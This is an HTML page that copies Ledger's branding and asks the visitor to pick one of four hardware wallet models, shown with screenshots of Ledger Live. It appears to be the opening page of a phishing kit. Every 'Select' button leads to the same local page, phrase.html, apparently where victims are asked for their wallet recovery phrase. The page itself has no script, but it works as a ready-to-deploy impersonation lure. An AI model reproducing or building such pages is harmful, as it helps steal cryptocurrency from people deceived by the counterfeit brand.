<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Select Your Device | Ledger</title>

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="favicon.png">

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #0e0d0e;
      color: #ffffff;
      font-family: 'Space Mono', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 60px 20px;
    }

    .logo-container {
      position: relative;
      display: inline-block;
      text-align: center;
      margin-bottom: 40px; /* Distance between LEDGER and SELECT YOUR DEVICE */
    }

    .logo {
      font-weight: 700;
      font-size: 22px;
      letter-spacing: 4px;
      color: #ffffff;
      padding: 20px 60px;
      position: relative;
      display: inline-block;
    }

    /* Corner style brackets */
    .logo::before,
    .logo::after {
      content: "";
      position: absolute;
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff;
    }

    .logo::before {
      top: 0;
      left: 0;
      border-right: none;
      border-bottom: none;
    }

    .logo::after {
      bottom: 0;
      right: 0;
      border-left: none;
      border-top: none;
    }

    .title {
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 4px;
      margin-bottom: 80px;
    }

    .devices {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      flex-wrap: wrap;
      gap: 80px;
    }

    .device {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      max-width: 220px;
    }

    .device img {
      width: 180px;
      height: 180px;
      object-fit: contain;
      margin-bottom: 25px;
      transition: transform 0.3s ease;
    }

    .device img:hover {
      transform: scale(1.08);
    }

    .device h3 {
      font-size: 20px;
      margin-bottom: 20px;
    }

    .select-btn {
      background-color: #ffffff;
      color: #000000;
      border: none;
      border-radius: 25px;
      padding: 10px 30px;
      font-family: 'Space Mono', monospace;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .select-btn:hover {
      background-color: #b3b3b3;
    }

    @media (max-width: 900px) {
      .devices {
        flex-direction: column;
        gap: 60px;
      }
    }
  </style>
</head>
<body>

  <div class="logo-container">
    <div class="logo">LEDGER</div>
  </div>

  <h1 class="title">SELECT YOUR DEVICE</h1>

  <section class="devices">

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-57-28 Ledger Live.png" alt="Device 1">
      <h3>Ledger Stax</h3>
      <a href="phrase.html">
        <button class="select-btn">Select</button>
      </a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-57-56 Ledger Live.png" alt="Device 2">
      <h3>Ledger Flex</h3>
      <a href="phrase.html">
        <button class="select-btn">Select</button>
      </a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-58-33 Ledger Live.png" alt="Device 3">
      <h3>Ledger Nano S & Plus</h3>
      <a href="phrase.html">
        <button class="select-btn">Select</button>
      </a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-59-01 Ledger Live.png" alt="Device 4">
      <h3>Ledger Nano X</h3>
      <a href="phrase.html">
        <button class="select-btn">Select</button>
      </a>
    </div>

  </section>

</body>
</html>
